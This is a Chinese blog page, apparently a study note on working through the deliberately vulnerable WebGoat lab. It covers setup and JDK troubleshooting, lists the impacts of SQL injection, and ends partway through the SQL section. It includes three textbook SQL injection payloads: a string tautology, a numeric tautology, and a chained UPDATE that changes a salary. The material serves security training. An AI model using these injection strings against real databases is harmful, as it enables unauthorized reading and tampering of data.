
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      <link rel="icon" href="../../assets/favicon.ico">
      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.5.3">
    
    
      
        <title>Webgoat靶场通关 - 仕林博园</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.7a952b86.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
        
          
          
          <meta name="theme-color" content="#ffffff">
        
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="red">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#webgoat" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href="../.." title="仕林博园" class="md-header__button md-logo" aria-label="仕林博园" data-md-component="logo">
      
  <img src="../../assets/logo_white.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            仕林博园
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Webgoat靶场通关
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/robinwangw/MkDocs" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    MkDocs
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="仕林博园" class="md-nav__button md-logo" aria-label="仕林博园" data-md-component="logo">
      
  <img src="../../assets/logo_white.png" alt="logo">

    </a>
    仕林博园
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/robinwangw/MkDocs" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    MkDocs
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Index
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          Android
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Android" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Android
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Android/Santoku%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/" class="md-nav__link">
        Santoku安装配置
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          JavaAudit
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="JavaAudit" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          JavaAudit
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Webgoat靶场通关
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Webgoat靶场通关
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#webgoat" class="md-nav__link">
    搭建webgoat漏洞环境
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#webgoat_1" class="md-nav__link">
    WebGoat
  </a>
  
    <nav class="md-nav" aria-label="WebGoat">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql" class="md-nav__link">
    SQL
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection" class="md-nav__link">
    SQL Injection
  </a>
  
    <nav class="md-nav" aria-label="SQL Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql_1" class="md-nav__link">
    SQL注入危害、后果
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql_2" class="md-nav__link">
    SQL注入严重性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#special-characters" class="md-nav__link">
    Special Characters，特殊字符
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#authentication-bypasses" class="md-nav__link">
    Authentication Bypasses
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jwt-token" class="md-nav__link">
    JWT Token
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-reset" class="md-nav__link">
    Password Reset
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe" class="md-nav__link">
    XXE
  </a>
  
    <nav class="md-nav" aria-label="XXE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#xxe-injection" class="md-nav__link">
    XXE Injection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-dos" class="md-nav__link">
    XXE DOS攻击
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#insecure-direct-object-references" class="md-nav__link">
    Insecure Direct Object References
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#insecure-deserialization" class="md-nav__link">
    Insecure Deserialization
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-components" class="md-nav__link">
    Vulnerable Components
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cross-site-request-forgeries" class="md-nav__link">
    Cross-Site Request Forgeries
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#challengectf" class="md-nav__link">
    Challenge(CTF)
  </a>
  
    <nav class="md-nav" aria-label="Challenge(CTF)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#admin-lost-password" class="md-nav__link">
    Admin lost password
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#without-password" class="md-nav__link">
    Without password
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#admin-password-reset" class="md-nav__link">
    Admin password reset
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          K8S
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="K8S" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          K8S
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../K8S/%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BAK8S%E9%9B%86%E7%BE%A4/" class="md-nav__link">
        从零搭建K8S集群
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          等保
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="等保" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          等保
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../%E7%AD%89%E4%BF%9D/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%90%88%E8%A7%84%E5%9F%B9%E8%AE%AD/" class="md-nav__link">
        信息安全合规培训
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../%E7%AD%89%E4%BF%9D/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E6%B5%8B%E8%AF%84%E9%AB%98%E9%A3%8E%E9%99%A9%E5%88%A4%E5%AE%9A%E6%8C%87%E5%BC%95/" class="md-nav__link">
        网络安全等级保护测评高风险判定指引
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#webgoat" class="md-nav__link">
    搭建webgoat漏洞环境
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#webgoat_1" class="md-nav__link">
    WebGoat
  </a>
  
    <nav class="md-nav" aria-label="WebGoat">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql" class="md-nav__link">
    SQL
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection" class="md-nav__link">
    SQL Injection
  </a>
  
    <nav class="md-nav" aria-label="SQL Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql_1" class="md-nav__link">
    SQL注入危害、后果
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql_2" class="md-nav__link">
    SQL注入严重性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#special-characters" class="md-nav__link">
    Special Characters，特殊字符
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#authentication-bypasses" class="md-nav__link">
    Authentication Bypasses
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jwt-token" class="md-nav__link">
    JWT Token
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-reset" class="md-nav__link">
    Password Reset
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe" class="md-nav__link">
    XXE
  </a>
  
    <nav class="md-nav" aria-label="XXE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#xxe-injection" class="md-nav__link">
    XXE Injection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-dos" class="md-nav__link">
    XXE DOS攻击
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#insecure-direct-object-references" class="md-nav__link">
    Insecure Direct Object References
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#insecure-deserialization" class="md-nav__link">
    Insecure Deserialization
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-components" class="md-nav__link">
    Vulnerable Components
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cross-site-request-forgeries" class="md-nav__link">
    Cross-Site Request Forgeries
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#challengectf" class="md-nav__link">
    Challenge(CTF)
  </a>
  
    <nav class="md-nav" aria-label="Challenge(CTF)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#admin-lost-password" class="md-nav__link">
    Admin lost password
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#without-password" class="md-nav__link">
    Without password
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#admin-password-reset" class="md-nav__link">
    Admin password reset
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  <a href="https://github.com/robinwangw/MkDocs/edit/master/docs/JavaAudit/webgoat靶场通关.md" title="编辑此页" class="md-content__button md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
  </a>


  <h1>Webgoat靶场通关</h1>

<h3 id="webgoat">搭建<code>webgoat</code>漏洞环境</h3>
<p>从<code>github</code>下载项目源码：<code>git clone https://github.com/WebGoat/WebGoat.git</code></p>
<p>使用<code>idea2019.2.4(Ultimate Edition)</code>（版本很老了）的<code>ide</code>工具打开项目，检查<code>maven</code>仓库配置信息（默认在<code>C</code>盘用户目录下，如果<code>C</code>盘空间不够，建议修改到其他盘）</p>
<p><img alt="image-20221226150838099" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221226150838099.png" /></p>
<p>等待<code>maven</code>下载项目所需的<code>jar</code>包，查看<code>maven</code>下载包的配置是否下载源码和文档（建议都下载）</p>
<p><img alt="image-20221226151444610" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221226151444610.png" /></p>
<p>配置项目启动信息：<code>Project Structure</code></p>
<p><img alt="image-20221226151953614" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221226151953614.png" /></p>
<p><img alt="image-20221226152329843" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221226152329843.png" /></p>
<p><img alt="image-20221226152500121" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221226152500121.png" /></p>
<p>项目启动配置：查看是否出现<code>StartWebGoat</code>信息</p>
<p><img alt="image-20221226152854989" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221226152854989.png" /></p>
<p>如果没有，先找到文件位置<code>webgoat-server/src/main/java/org/owasp/webgoat/StartWebGoat</code>，进行启动</p>
<p><img alt="image-20221226153201115" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221226153201115.png" /></p>
<p>遇到的问题：</p>
<p>错误一：编译过程中出现“<code>java</code>：无效的源发行版：<code>12</code>”</p>
<p>检查项目结构<code>(File - Project Structure)</code>中项目和模块所使用的<code>JDK</code>版本是否一致</p>
<p>错误二：编译过程中出现“<code>java</code>：错误：不支持发行版本<code>17</code>”</p>
<p>点击“<code>File - Setting</code>，找到<code>Java Compiler</code>，查看<code>ide</code>支持的最大<code>language level</code></p>
<p><img alt="image-20221226155444857" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221226155444857.png" /></p>
<p>比如我使用的<code>ide</code>版本比较老旧，支持的<code>bytecode version</code>最大是<code>13</code>，这里使用的<code>JDK</code>版本是<code>openjdk11.0.17</code>，因此设置<code>bytecode version</code>为<code>11</code></p>
<p>错误三、启动过程报错：<code>java:-source</code>中不支持<code>instanceof</code>中的模式匹配</p>
<p>原因是通过<code>git</code>下载的默认版本是使用高版本的<code>JDK17</code>编译的，如果<code>IDE</code>支持<code>JDK17</code>，可以参照前面的步骤设置项目和模块的<code>JDK</code>版本。因为我使用的是<code>idea2019.2.4 utimate</code>，不支持<code>JDK17</code>的语法特性，要么升级<code>IDE</code>到最新版，要么降低项目使用的<code>JDK</code>版本。这里我选择下载旧版本的项目源码：</p>
<p>在<code>GitHub</code>仓库上查找分支，参考<a href="https://www.freebuf.com/articles/web/231220.html"><code>freebuf</code>上的文章</a>中使用的环境：<code>JDK11</code>，<code>webgoat8.0.0.M24</code>，我这里选择最接近的版本<code>8.0.0.M26</code></p>
<p><img alt="image-20221226172847312" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221226172847312.png" /></p>
<p>使用<code>git</code>下载指定的分支：</p>
<div class="highlight"><pre><span></span><code>git clone  --branch release/v8.0.0.M26 --single-branch https://github.com/WebGoat/WebGoat.git
</code></pre></div>
<p>然后重新使用<code>idea</code>打开项目，即可。</p>
<h3 id="webgoat_1"><code>WebGoat</code></h3>
<h4 id="sql"><code>SQL</code></h4>
<ul>
<li><code>DML</code>:<code>Data Manipulation Language，select、insert、update、delete</code></li>
<li><code>DDL</code>:<code>Data Definition Language，create、alter、drop</code></li>
<li><code>DCL</code>:<code>Data Control Language，grant、revoke</code></li>
</ul>
<h4 id="sql-injection"><code>SQL Injection</code></h4>
<h5 id="sql_1"><code>SQL</code>注入危害、后果</h5>
<ul>
<li>读取、修改敏感数据</li>
<li>执行管理员操作：</li>
<li>关闭审计服务甚至关闭数据库系统</li>
<li>删除表及日志</li>
<li>添加用户</li>
<li>覆盖数据库文件内容</li>
<li>操作系统命令执行</li>
</ul>
<p><code>SQL injection attacks allow attackers to</code></p>
<ul>
<li><code>Spoof identity</code>，伪造身份</li>
<li><code>Tamper with existing data</code>，篡改数据</li>
<li><code>Cause repudiation issues such as voiding transactions or changing balances</code>，导致交易作废或修改余额</li>
<li><code>Allow the complete disclosure of all data on the system</code>，数据暴露</li>
<li><code>Destroy the data or make it otherwise unavailable</code>，毁坏数据或致其不可用</li>
<li><code>Become administrator of the database server</code>，获取数据库系统管理员权限</li>
</ul>
<h5 id="sql_2"><code>SQL</code>注入严重性</h5>
<p><code>SQL</code>注入的严重性取决于：攻击者的技能和想象力，纵深防御策略（输入验证、最小权限等），数据技术</p>
<ul>
<li><code>String SQL Injection</code></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">user_data</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">first_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;John&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">last_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;{&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1}&#39;</span><span class="w"></span>
</code></pre></div>
<ul>
<li><code>Numeric SQL Injection</code></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">From</span><span class="w"> </span><span class="n">user_data</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">login_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">userid</span><span class="o">=</span><span class="w"> </span><span class="err">{</span><span class="mi">11</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="c1">--}</span>
</code></pre></div>
<ul>
<li><code>Query chaining</code></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">From</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">last_name</span><span class="o">=</span><span class="s1">&#39;{Smith&#39;</span><span class="p">;</span><span class="k">UPDATE</span><span class="w"> </span><span class="n">employees</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">salary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2147483647</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TAN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;3SL99A&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">--}&#39;</span>
